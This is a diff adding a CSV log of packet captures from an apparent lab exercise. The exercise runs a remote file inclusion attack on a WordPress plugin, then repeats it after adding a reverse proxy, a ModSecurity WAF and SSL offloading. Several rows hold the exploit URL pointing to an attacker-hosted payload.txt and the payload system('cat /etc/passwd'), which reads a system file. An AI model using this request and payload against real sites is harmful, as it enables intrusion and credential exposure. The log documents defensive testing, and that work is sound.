@@ -1,0 +1,43 @@
+Filename,Packet type,Packet number,Source IP,Destination IP,Source Port,Destination Port,TCP stream,Notes
+Default network configuration,,,,,,,,
+Red-Team-1.pcapng,1A (RFI request),1119,192.168.100.20,192.168.100.2,39706,80,1,Contains initial attacker XSS request initiating the exploit (GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt)
+Red-Team-1.pcapng,2A (Payload request),1134,192.168.100.254,192.168.100.20,18969,8000,2,Contains WordPress server request (GET /payload.txt?swp_debug=get_user_options HTTP/1.0)
+Red-Team-1.pcapng,2B (Payload response),1137,192.168.100.20,192.168.100.254,8000,18969,2,Contains SimpleHTTP server response from attacker (<pre>system('cat /etc/passwd')</pre>)
+Red-Team-1.pcapng,1B (WordPress response),1150,192.168.100.2,192.168.100.20,80,39706,1,Contains WordPress server response with contents of /etc/passwd
+,,,,,,,,
+Red-Team-2.pcapng,1A (RFI request),38576,192.168.100.20,192.168.100.2,55900,80,20,Contains initial attacker XSS request initiating the exploit (GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt)
+Red-Team-2.pcapng,2A (Payload request),40964,192.168.100.254,192.168.100.20,36353,8000,32,Contains WordPress server request (GET /payload.txt?swp_debug=get_user_options HTTP/1.0)
+Red-Team-2.pcapng,2B (Payload response),40976,192.168.100.20,192.168.100.254,8000,36353,32,Contains SimpleHTTP server response from attacker (<pre>system('cat /etc/passwd')</pre>)
+Red-Team-2.pcapng,1B (WordPress response),41012,192.168.100.2,192.168.100.20,80,55900,20,Contains WordPress server response with contents of /etc/passwd
+,,,,,,,,
+pfSense-WAN-1.pcap,1A (RFI request),6,192.168.100.20,192.168.100.2,51564,80,0,Contains initial attacker XSS request initiating the exploit (GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt)
+pfSense-WAN-1.pcap,2A (Payload request),11,192.168.100.254,192.168.100.20,18936,8000,1,Contains WordPress server request (GET /payload.txt?swp_debug=get_user_options HTTP/1.0)
+pfSense-WAN-1.pcap,2B (Payload response),15,192.168.100.20,192.168.100.254,8000,18936,1,Contains SimpleHTTP server response from attacker (<pre>system('cat /etc/passwd')</pre>)
+pfSense-WAN-1.pcap,1B (WordPress response),57,192.168.100.2,192.168.100.20,80,51564,0,Contains WordPress server response with contents of /etc/passwd
+,,,,,,,,
+pfSense-LAN-1.pcap,1A (RFI request),4,192.168.100.20,10.20.30.130,45960,80,0,Contains initial attacker XSS request initiating the exploit (GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt)
+pfSense-LAN-1.pcap,2A (Payload request),9,10.20.30.130,192.168.100.20,44316,8000,1,Contains WordPress server request (GET /payload.txt?swp_debug=get_user_options HTTP/1.0)
+pfSense-LAN-1.pcap,2B (Payload response),12,192.168.100.20,10.20.30.130,8000,44316,1,Contains SimpleHTTP server response from attacker (<pre>system('cat /etc/passwd')</pre>)
+pfSense-LAN-1.pcap,1B (WordPress response),54,10.20.30.130,192.168.100.20,80,45960,0,Contains WordPress server response with contents of /etc/passwd
+After implementing the reverse proxy,,,,,,,,
+pfSense-LAN-2.pcap,1A (RFI request),4,192.168.100.20,10.20.30.220,39736,80,0,Contains initial attacker XSS request initiating the exploit (GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt)
+pfSense-LAN-2.pcap,1A (RFI request),11,10.20.30.220,10.20.30.130,56616,80,2,proxy sending XSS request to server
+pfSense-LAN-2.pcap,2A (Payload request),16,10.20.30.130,192.168.100.20,57542,8000,3,server sending patload request to client (attacker)
+pfSense-LAN-2.pcap,2B (Payload response),19,192.168.100.20,10.20.30.130,8000,57542,3,Client sending back payload directly to server
+pfSense-LAN-2.pcap,1B (WordPress response),52,10.20.30.130,10.20.30.220,80,56616,2,Server sending response to proxy
+pfSense-LAN-2.pcap,1B (WordPress response),55,10.20.30.220,192.168.100.20,80,39736,0,proxy sending WordPress server response with contents of /etc/passwd to client
+After enabling the ModSecurity WAF,,,,,,,,
+pfSense-LAN-3.pcap,1A (RFI request),4,192.168.100.20,192.168.100.2,41398,80,0,Contains initial attacker XSS request initiating the exploit (GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt)
+pfSense-LAN-3.pcap,1A (RFI request),,,,,,,
+pfSense-LAN-3.pcap,2A (Payload request),,,,,,,
+pfSense-LAN-3.pcap,2B (Payload response),6,192.168.100.2,192.168.100.20,80,41398,0,"reply [Status Code Description: Forbidden]
+"
+pfSense-LAN-3.pcap,1B (WordPress response),,,,,,,
+pfSense-LAN-3.pcap,1B (WordPress response),,,,,,,
+After implementing the SSL offloading on the reverse proxy,,,,,,,,
+pfSense-LAN-4.pcap,1A (RFI request),316,192.168.100.20,10.20.30.220,34896,80,7,Contains initial attacker XSS request initiating the exploit (GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt)
+pfSense-LAN-4.pcap,1A (RFI request),,,,,,,
+pfSense-LAN-4.pcap,2A (Payload request),,,,,,,
+pfSense-LAN-4.pcap,2B (Payload response),318,10.20.30.220,192.168.100.20,80,34896,7,301 moved permanently 
+pfSense-LAN-4.pcap,1B (WordPress response),,,,,,,
+pfSense-LAN-4.pcap,1B (WordPress response),,,,,,,
